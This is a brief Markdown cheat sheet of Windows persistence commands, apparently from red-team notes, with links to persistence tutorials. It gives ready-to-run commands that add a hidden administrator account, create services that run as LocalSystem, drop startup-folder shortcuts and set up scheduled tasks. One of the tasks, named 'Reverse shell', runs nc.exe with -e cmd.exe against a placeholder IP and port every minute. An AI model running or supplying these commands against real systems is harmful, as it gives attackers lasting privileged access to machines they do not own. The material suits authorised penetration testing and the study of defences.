## Create User:  
**Create user (CMD)**: net user username password /add  
**Add user to group (CMD)**: net localgroup Administrators username /add  
**Add user to group (Powershell)**: Add-LocalGroupMember -Group Administrators -Member username  

## Scheduled Tasks:  
**Local scheduled tast**: schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe <IP> <PORT> -e cmd.exe'  
**Create remote scheduled task**: schtasks /create /s "PC-NAME" /tn "My App" /tr "PATH" /sc minute /mo 1 /u Domain\User /p password  
**Logon Scripts**: schtasks /create /sc onlogon /tn "task-name" /tr "File or App PATH" /RU  "username"  

## Create Service:
sc create (service name) binpath= "cmd.exe /k C:\temp\pentestlab.exe" start="auto" obj="LocalSystem"  
sc start (service name)  

## Startup Folder:
**Add files/executables/links to user startup folder**: C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev.lnk  

## Abandoned processes:  
**Try to find processes with procmon.exe what statos is NOT_FOUND**.  
  
## Aditional Informaion:  
**Windows Tasks**:  
1. https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/  
2. https://dmfrsecurity.com/2021/09/07/scheduled-task-persistence/  
  
**Windows Registry**:  
1. https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/  
  
**Services**:
1. https://pentestlab.blog/2019/10/07/persistence-new-service/  
2. https://dmcxblue.gitbook.io/red-team-notes/persistence/new-service  

**Sturtup Folder**:  
1. https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder  
2. https://stmxcsr.com/persistence/looking-at-the-startup-directory.html  

